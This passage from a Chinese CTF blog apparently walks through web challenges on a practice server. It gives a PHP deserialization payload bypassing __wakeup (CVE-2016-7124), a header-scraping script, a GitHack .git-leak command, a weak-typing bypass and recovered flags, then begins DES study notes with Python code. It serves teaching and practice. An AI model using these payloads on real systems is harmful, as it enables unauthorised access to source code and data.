class="variable">$this</span>-&gt;time))&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&#x27;Sorry.&lt;br&gt;&#x27;</span>;</span><br><span class="line">                            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;time &lt; <span class="number">11</span> * <span class="number">22</span> * <span class="number">33</span> * <span class="number">44</span> * <span class="number">55</span> * <span class="number">66</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&#x27;you need a bigger time.&lt;br&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;time &gt; <span class="number">66</span> * <span class="number">55</span> * <span class="number">44</span> * <span class="number">33</span> * <span class="number">23</span> * <span class="number">11</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&#x27;you need a smaller time.&lt;br&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="title function_ invoke__">sleep</span>((<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;time);</span><br><span class="line">                            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;flag);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwotd = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;hello hacker,I have changed your password and time, rua!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;rua&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$rua</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rua&#x27;</span>];</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$rua</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Please don&#x27;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一题<strong>PHP</strong>反序列化，考点是**__wakeup<strong>方法的绕过【</strong>当成员属性数目大于实际数目时可绕过(CVE-2016-7124)，**时间的几个判断使用十六进制绕过就行了。</p>
<p>因此构造<strong>payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?rua=O:4:&quot;Time&quot;:6:&#123;s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:&#123;i:1;i:1;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag</strong>。</p>
<h3 id="web13"><a href="http://123.206.31.85:10013">WEB13</a></h3>
<p>看了一下，响应头里有个<strong>Base64</strong>编码的<strong>password</strong>。</p>
<p>提交了一下提示太慢，只好上爬虫了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://123.206.31.85:10013/index.php&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=gg5i701sc080tdc1u5bdacmj509k3m6i&#x27;</span>&#125;</span><br><span class="line">re = requests.get(url = url, headers = headers)</span><br><span class="line">password = base64.b64decode(re.headers[<span class="string">&#x27;Password&#x27;</span>])</span><br><span class="line">data = &#123;<span class="string">&#x27;password&#x27;</span>:password[<span class="number">5</span>:-<span class="number">1</span>]&#125;</span><br><span class="line">re = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span> re.content</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{FjXAkdGnOBoIUZaFzHqjInY2VndLSg}</strong>。</p>
<h3 id="web14"><a href="http://123.206.31.85:10014/">WEB14</a></h3>
<p>考察了<strong>git</strong>源码泄露。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python GitHack.py http://123.206.31.85:10014/.git/</span><br></pre></td></tr></table></figure>
<p>然后就有<strong>flag{GitIsAFreeVessionControlSyStem}</strong>。</p>
<h3 id="web15"><a href="http://123.206.31.85:10015">WEB15</a></h3>
<p>根据提示，源码泄漏，扫到<strong>index.php~</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;./flag.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:./1ndex.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)) &#123;</span><br><span class="line">            <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>);</span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$id</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="variable">$id</span>&gt;=<span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;快出去吧，走错路了～～～&lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;这么简单都不会么？&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="variable">$id</span>&gt;=<span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="variable">$flag</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;你走不到这一步的!&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<strong>case</strong>有错。</p>
<p>只要传入的参数为字符，经过函数<strong>intval</strong>转换后的结果就是为<strong>0</strong>，<strong>0&gt;=0</strong>得到的结果是<strong>true</strong>，弱类型比较后第一个得到的结果是<strong>case
1:</strong>，因此得以绕过，到第二个<strong>0&gt;=10</strong>的结果是<strong>false</strong>，弱类型比较后第二个的结果是<strong>case
0:</strong>，从而得到<strong>flag{Is_wh1te_ooo000oo0}</strong>。</p>
<h3 id="web16"><strong><a
href="123.206.31.85:1616">WEB16</a></strong></h3>
<p>翻了一下，发现三个<strong>JavaScript</strong>，一个是主函数，调用一个<strong>Base64</strong>和<strong>MD5</strong>加密，主函数<a
href="https://tool.lu/js/">解密</a>一下。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">cname</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> name = cname + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">	<span class="keyword">var</span> ca = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ca.<span class="property">length</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> c = ca[i].<span class="title function_">trim</span>();</span><br><span class="line">		<span class="keyword">if</span> (c.<span class="title function_">indexOf</span>(name) == <span class="number">0</span>) <span class="keyword">return</span> c.<span class="title function_">substring</span>(name.<span class="property">length</span>, c.<span class="property">length</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decode_create</span>(<span class="params">temp</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> base = <span class="keyword">new</span> <span class="title class_">Base64</span>();</span><br><span class="line">	<span class="keyword">var</span> result = base.<span class="title function_">decode</span>(temp);</span><br><span class="line">	<span class="keyword">var</span> result3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> num = result[i].<span class="title function_">charCodeAt</span>();</span><br><span class="line">		num = num ^ i;</span><br><span class="line">		num = num - ((i % <span class="number">10</span>) + <span class="number">2</span>);</span><br><span class="line">		result3 += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(num)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ertqwe</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> temp_name = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">	<span class="keyword">var</span> temp = <span class="title function_">getCookie</span>(temp_name);</span><br><span class="line">	temp = <span class="built_in">decodeURIComponent</span>(temp);</span><br><span class="line">	<span class="keyword">var</span> mingwen = <span class="title function_">decode_create</span>(temp);</span><br><span class="line">	<span class="keyword">var</span> ca = mingwen.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ca.<span class="property">length</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (-<span class="number">1</span> &lt; ca[i].<span class="title function_">indexOf</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">			key = ca[i + <span class="number">1</span>].<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	key = key.<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);</span><br><span class="line">	<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/1-2.jpg&quot;</span></span><br><span class="line">	&#125;, <span class="number">1000</span>);</span><br><span class="line">	<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/1-3.jpg&quot;</span></span><br><span class="line">	&#125;, <span class="number">2000</span>);</span><br><span class="line">	<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/1-4.jpg&quot;</span></span><br><span class="line">	&#125;, <span class="number">3000</span>);</span><br><span class="line">	<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;attack-1&quot;</span>).<span class="property">src</span> = <span class="string">&quot;image/6.png&quot;</span></span><br><span class="line">	&#125;, <span class="number">4000</span>);</span><br><span class="line">	<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="title function_">alert</span>(<span class="string">&quot;你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!flag&#123;&quot;</span> + <span class="title function_">md5</span>(key) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">	&#125;, <span class="number">5000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学 从入门到放弃 分组密码</title>
    <url>/Study-Cipher-Block/</url>
    <content><![CDATA[<p><strong>XMan
Day2</strong>，整理一下<strong>bibi</strong>师傅的笔记。</p>
<p>分组密码部分。</p>
<span id="more"></span>
<p>分组密码【<strong>Block
Cipher</strong>的数学模型是将明文消息编码表示后的数字【简称明文数字，划分成长度为<strong>n</strong>的组，每组分别在密钥的控制下变换成等长的密文，常见的有<strong>DES</strong>和<strong>AES</strong>这两大对称加密算法。</p>
<p>分组密码通常是按固定规模将明文分组，对每组均使用一个固定的加密变换来进行运算。</p>
<h3 id="des">DES</h3>
<h4 id="功能简述">功能简述</h4>
<p>给定一个<strong>64</strong>位的明文和一个<strong>64</strong>位的密钥，输出一个<strong>64</strong>位的密文。这个密文可以用相同的密钥解密。</p>
<p>而<strong>64</strong>位的秘钥中，只有<strong>54</strong>位在起作用。剩余的位可以直接丢弃，或者当作奇偶校验位。</p>
<h4 id="算法流程图">算法流程图</h4>
<figure>
<img src="/images/Study-Cipher-Block/figure2-des_block.gif" alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h5 id="秘钥置换详解">秘钥置换详解</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">left_rotate</span>(<span class="params">res, offset</span>):</span><br><span class="line">    <span class="keyword">return</span> res[offset:] + res[:offset]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC1</span>(<span class="params">key</span>):</span><br><span class="line">    pc1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">           <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">           <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">           <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">    k1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pc1:</span><br><span class="line">        k1.append(key[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> k1[<span class="number">0</span>:<span class="number">28</span>], k1[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC2</span>(<span class="params">key</span>):</span><br><span class="line">    pc2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">           <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">           <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">           <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">return</span> [key[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> pc2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_generate</span>(<span class="params">key</span>):</span><br><span class="line">    l, r = PC1(key)</span><br><span class="line">    offset = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> offset:</span><br><span class="line">        l = left_rotate(l, i)</span><br><span class="line">        r = left_rotate(r, i)</span><br><span class="line">        res.append(PC2(l + r))</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<p>传入<strong>key</strong>后，第一轮先经<strong>pc1</strong>选择置换获得<strong>56</strong>位秘钥，然后拆分成左右两半。</p>
<p>得到左右两半秘钥后，经左偏移表分别偏移相应位数，拼接，再经<strong>pc2</strong>选择置换获得<strong>48</strong>位的子秘钥。</p>
<p>左偏移表长为<strong>16</strong>位，因此共计<strong>16</strong>轮，最后得到<strong>16</strong>组<strong>48</strong>位的子秘钥。</p>
<h5 id="加密主体">加密主体</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">message</span>):</span><br><span class="line">    ip = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">          <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">          <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">          <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">    m1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip:</span><br><span class="line">        m1.append(message[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> m1[<span class="number">0</span>:<span class="number">32</span>], m1[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FP</span>(<span class="params">m</span>):</span><br><span class="line">    fp = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">          <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">          <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">          <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> fp]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">S</span>(<span class="params">m</span>):</span><br><span class="line">    s = [[</span><br><span class="line">        [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>], [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>], [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>], [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>], [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>], [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>], [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>], [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>], [<span 